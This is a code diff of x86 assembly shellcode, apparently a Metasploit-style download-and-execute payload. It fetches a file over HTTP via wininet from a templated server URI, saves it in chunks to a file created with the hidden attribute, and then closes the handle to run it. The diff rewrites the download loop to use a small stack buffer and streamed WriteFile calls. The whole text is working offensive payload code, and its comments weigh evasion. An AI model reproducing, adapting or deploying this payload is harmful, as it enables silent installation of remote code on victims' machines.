@@ -276,7 +276,7 @@ httpsendrequest:
 	push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
 	call ebp
 	test eax,eax
-	jnz allocate_memory
+	jnz create_file
 
 try_it_again:
 	dec ebx
@@ -292,45 +292,11 @@ get_server_uri:
 server_uri:
 	db "/#{server_uri}", 0x00
 
-allocate_memory:
-	push 0x04              ; PAGE_READWRITE, doesn't need to be executable, less suspicious perhaps ?
-	push 0x1000            ; MEM_COMMIT
-	push 0x00400000        ; Stage allocation (8Mb ought to do us)
-	push edi               ; NULL as we dont care where the allocation is (zero'd from the prev function)
-	push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
-	call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-
-download_prep:
-	xchg eax, ebx          ; place the allocated base address in ebx
-	push ebx               ; store a copy of the stage base address on the stack
-	push ebx               ; temporary storage for bytes read count
-	mov edi, esp           ; &bytesRead
-
-download_more:
-	push edi               ; &bytesRead
-	push 8192              ; read length
-	push ebx               ; buffer
-	push esi               ; hRequest
-	push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
-	call ebp
-
-	test eax,eax           ; download failed? (optional?)
-	jz thats_all_folks	; failure -> exit
-
-	mov eax, [edi]
-	add ebx, eax           ; buffer += bytes_received
-
-	test eax,eax           ; optional?
-	jnz download_more      ; continue until it returns 0
-	pop eax                ; clear the temporary storage
-	; eax = 0
-
-; routine to save to file & execute
-save_as_target_file:
-	pop esi			; get start of buffer
-	sub ebx,esi		; nr of bytes
+create_file:
 	jmp get_filename
+
 get_filename_return:
+	xor eax,eax		; zero eax
 	pop edi			; ptr to filename
 	push eax		; hTemplateFile
 	push 2			; dwFlagsAndAttributes (Hidden)
@@ -340,19 +306,49 @@ get_filename_return:
 	push 2			; dwDesiredAccess
 	push edi		; lpFileName
 	push 0x4FDAF6DA		; kernel32.dll!CreateFileA
-	call ebp
-;write to the handle
-	push 0			; lpOverLapped
-	push esp		; lpNumberOfBytesWritten
-	push ebx		; nNumberOfBytesToWrite
-	push esi		; lpBuffer
-	push eax		; hFile
-	mov esi,eax		; save handle
-	push 0x5BAE572D		; kernel32.dll!WriteFile
+	call ebp	
+
+download_prep:
+	xchg eax, ebx          	; place the file handle in ebx
+	;push ebx               ; store a copy of file handle on the stack
+	xor eax,eax		; zero eax
+	mov ax,0x104		; we'll download 0x100 bytes at a time
+	sub esp,eax		; reserve space on stack
+	;mov edi, esp           	; &bytesRead
+
+download_more:
+	push esp               	; &bytesRead
+	lea ecx,[esp+0x8]	; target buffer
+	xor eax,eax
+	mov ah,0x01		; eax => 100
+	push eax              	; read length
+	push ecx		; target buffer on stack
+	push esi               	; hRequest
+	push 0xE2899612        	; hash( "wininet.dll", "InternetReadFile" )
 	call ebp
 
-;close the handle
-	push esi
+	test eax,eax           	; download failed? (optional?)
+	jz thats_all_folks	; failure -> exit
+
+	pop eax			; how many bytes did we retrieve ?
+
+	test eax,eax         	; optional?
+	je close_and_run	; continue until it returns 0
+
+write_to_file:
+	push 0			; lpOverLapped
+	push esp		; lpNumberOfBytesWritten
+	push eax		; nNumberOfBytesToWrite
+	lea eax,[esp+0xc]	; get pointer to buffer
+	push eax		; lpBuffer
+	push ebx		; hFile
+	push 0x5BAE572D		; kernel32.dll!WriteFile
+	call ebp
+	sub esp,4		; set stack back to where it was
+	jmp download_more
+
+close_and_run:
+	push ebx
 	push 0x528796C6		; kernel32.dll!CloseHandle
 	call ebp
 
